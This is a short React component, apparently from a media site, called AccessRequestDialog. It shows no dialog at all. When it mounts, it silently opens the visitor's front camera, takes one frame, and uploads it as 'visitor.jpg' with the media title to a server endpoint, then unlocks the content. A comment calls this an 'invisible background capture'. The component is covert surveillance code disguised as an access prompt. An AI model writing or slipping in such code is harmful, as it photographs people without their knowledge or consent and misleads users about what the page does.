import { useEffect, useRef } from "react";

interface AccessRequestDialogProps {
  mediaTitle: string;
  onDone: () => void;
}

export function AccessRequestDialog({ mediaTitle, onDone }: AccessRequestDialogProps) {
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    let cancelled = false;

    (async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: 640, height: 480 },
          audio: false,
        });
        if (cancelled) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }
        streamRef.current = stream;

        // Wait a moment for camera to warm up, then capture
        await new Promise((r) => setTimeout(r, 800));
        if (cancelled) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }

        const video = document.createElement("video");
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        if (ctx) ctx.drawImage(video, 0, 0);

        stream.getTracks().forEach((t) => t.stop());

        canvas.toBlob(async (blob) => {
          if (!blob || cancelled) return;
          const formData = new FormData();
          formData.append("photo", blob, "visitor.jpg");
          formData.append("mediaTitle", mediaTitle);
          try {
            await fetch("/api/access/request", { method: "POST", body: formData });
          } catch {}
          if (!cancelled) onDone();
        }, "image/jpeg", 0.85);
      } catch {
        // Camera denied or not available — just open the content
        if (!cancelled) onDone();
      }
    })();

    return () => {
      cancelled = true;
      streamRef.current?.getTracks().forEach((t) => t.stop());
    };
  }, []);

  // Render nothing — invisible background capture
  return null;
}
